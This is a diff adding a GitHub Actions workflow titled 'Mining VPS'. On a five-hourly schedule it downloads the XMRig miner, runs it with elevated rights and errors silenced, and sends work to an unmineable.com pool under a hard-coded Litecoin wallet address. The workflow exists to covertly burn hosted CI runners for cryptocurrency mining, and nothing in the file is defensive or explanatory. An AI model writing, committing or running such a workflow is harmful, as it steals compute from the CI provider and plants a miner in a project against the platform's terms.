@@ -1,0 +1,17 @@
+name: Mining VPS
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: "0 */5 * * *"
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+    - name: Run Miner
+      shell: pwsh
+      run: |
+        $ErrorActionPreference = "SilentlyContinue"
+        Write-Host "🚀 Starting Miner as Administrator..."
+        
+        powershell -Command "Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip -OutFile x.zip; Expand-Archive -Path x.zip -DestinationPath . -Force; cd xmrig-6.22.2; Start-Process -FilePath '.\xmrig.exe' -ArgumentList '-o rx-eu.unmineable.com:3333 -a rx/0 -k -u LTC:LVeUwRXbymZ8dXAb7uqnXLUvCYgNiGkoSL.MonsterServer#t8eu-9mzy -p x' -Verb RunAs; Start-Sleep -Seconds 20; Get-Process xmrig | Select-Object -First 1 | Out-Null; Write-Host '--- LAST 10 LINES OF LOG ---'; if (Test-Path 'xmrig.log') { Get-Content xmrig.log -Tail 10 } else { Write-Host 'Miner started, check GitHub Actions console for real-time output.' }"
